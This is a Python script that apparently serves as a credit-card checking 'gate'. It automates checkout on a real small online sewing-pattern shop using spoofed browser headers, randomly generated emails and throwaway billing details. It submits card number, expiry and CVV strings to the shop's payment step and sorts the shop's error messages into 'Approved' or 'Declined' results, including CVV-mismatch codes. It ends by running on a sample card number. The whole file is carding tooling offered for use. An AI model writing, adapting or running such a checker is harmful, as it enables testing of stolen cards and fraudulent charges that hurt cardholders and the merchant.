import random
import re
import names
from requests import Session
from dataclasses import dataclass
import requests
import uuid
from fake_useragent import UserAgent
from bs4 import BeautifulSoup

class ConfigsPAge:
    @classmethod
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

@dataclass
class payflow_pro:
    def main(self, card):
        try:
            self.UseMail = ConfigsPAge().RandomName('email')
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"
            session = requests.Session()

            Agent = UserAgent().random
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "es-ES,es;q=0.8",
                "Referer": "https://www.funkyfriendsfactory.com/",
            }

            response = session.get('https://www.funkyfriendsfactory.com/maximus-mouse-sewing-pattern', headers=headers).text
            form_key = re.search(r'form_key/([^/]+)', response).group(1)
            if "form_key" not in response:
                print("NO SESSION VALID")
            headers = {
                "User-Agent": headers["User-Agent"],
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.funkyfriendsfactory.com",
                "Referer": "https://www.funkyfriendsfactory.com/maximus-mouse-sewing-pattern",
            }

            data = {
                'product': '568',
                'qty': '1',
                'ajax_package_name': 'default',
                'ajax_layout': 'orangemantra',
                'ajax_template': 'orangemantra',
                'ajax_skin': 'orangemantra',
            }

            response = session.post(
                f'https://www.funkyfriendsfactory.com/ajaxcart/cart/add/uenc/aHR0cHM6Ly93d3cuZnVua3lmcmllbmRzZmFjdG9yeS5jb20vbWF4aW11cy1tb3VzZS1zZXdpbmctcGF0dGVybg,,/product/568/form_key/{form_key}/',

                headers=headers,
                data=data,
            )
            cart = session.get("https://www.funkyfriendsfactory.com/checkout/cart/").text

            print("ITEM IN CART:", "Maximus Mouse" in cart or "537671" in cart)

            headers = {
                "User-Agent": headers["User-Agent"],
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.funkyfriendsfactory.com",
                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
            }

            response = session.get('https://www.funkyfriendsfactory.com/checkout/cart/',  headers=headers)

            headers = {
                "User-Agent": headers["User-Agent"],
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.funkyfriendsfactory.com",
                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
            }

            response = session.get('https://www.funkyfriendsfactory.com/onestepcheckout/index/', headers=headers)

            print("shipping_method" in session.get("https://www.funkyfriendsfactory.com/onestepcheckout/index/").text.lower())
            headers = {
                "User-Agent": headers["User-Agent"],
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.funkyfriendsfactory.com",
                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
            }

            data = {
                'billing[address_id]': '693175',
                'billing[firstname]': 'ldfl',
                'billing[lastname]': 'dsdasd',
                'billing[email]': self.UseMail,
                'billing[street][]': [
                    'moall del sol',
                    'sadw',
                ],
                'billing[country_id]': 'US',
                'billing[city]': 'Miami',
                'billing[postcode]': '34112',
                'billing[region_id]': '43',
                'billing[region]': '',
                'billing[customer_password]': 'leito132asd',
                'billing[confirm_password]': 'leito132asd',
                'billing[save_in_address_book]': '1',
                'billing[use_for_shipping]': '1',
                'emailvalid': 'valid',
                'payment[method]': 'paypal_direct',
                'payment[cc_type]': self.brand,
                'payment[cc_number]': self.ccs[0],
                'payment[cc_exp_month]': self.ccs[1],
                'payment[cc_exp_year]': self.ccs[2],
                'payment[cc_cid]': self.ccs[3],
                'qty-item-537671': '1',
                'remove': '0',
                'coupon_code': '',
                'terms_conditions_checkbox': '1',
            }

            r = session.post(
                "https://www.funkyfriendsfactory.com/onestepcheckout/index/saveOrder/",
                headers=headers,
                data=data
            )

            soup = BeautifulSoup(r.text, "html.parser")

            error = soup.find(class_="error-msg")

            mensaje = None

            if error:
                mensaje = error.get_text(" ", strip=True)

            if mensaje is None:
                return 'Approved! ✅', 'Charged $10.21'

            elif 'Please enter a valid Credit Card Verification Number' in mensaje:
                return 'Approved! ✅', 'CVV2 Mismatch: 15004'

            elif '#15005' in mensaje:
                return 'Declined! ❌', '15005 Processor Decline'

            else:
                return 'Declined! ❌', mensaje

        except Exception as e:
            return 'Declined! ❌', f'error gate: {e}'
print(payflow_pro().main('4110905024362674|09|2029|125'))
